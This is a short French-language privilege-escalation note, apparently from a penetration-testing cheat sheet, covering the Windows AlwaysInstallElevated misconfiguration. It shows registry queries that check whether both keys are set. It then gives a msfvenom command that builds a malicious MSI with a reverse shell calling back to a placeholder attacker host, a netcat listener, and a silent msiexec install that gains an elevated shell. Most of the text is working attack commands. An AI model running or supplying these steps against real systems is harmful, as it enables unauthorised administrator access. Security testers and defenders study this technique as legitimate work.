Les programmes d'installation Windows (`.msi`) sont utilisés pour installer des applications. 
Ils s'exécutent généralement avec le niveau de privilèges de l'utilisateur qui les démarre. 

Cela pourrait potentiellement nous permettre de générer un fichier MSI malveillant qui s'exécuterait avec les privilèges d'administrateur.

Cette méthode nécessite la définition de deux valeurs de registre :

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

> Pour pouvoir exploiter cette vulnérabilité, les deux clés de registre doivent être définis sur 1 (`0x1`). Dans le cas contraire, l'exploitation ne sera pas possible. 

## Exploitation 

Si ceux-ci sont définis, vous pouvez générer un fichier `.msi` malveillant :

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK_IP LPORT=9001 -f msi -o malicious.msi
```

```sh
nc -nlvp 9001
```

Une fois que vous avez transféré le fichier malveillant, vous pouvez exécuter le programme d'installation avec la commande ci-dessous et recevoir le shell inverse :

```sh
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
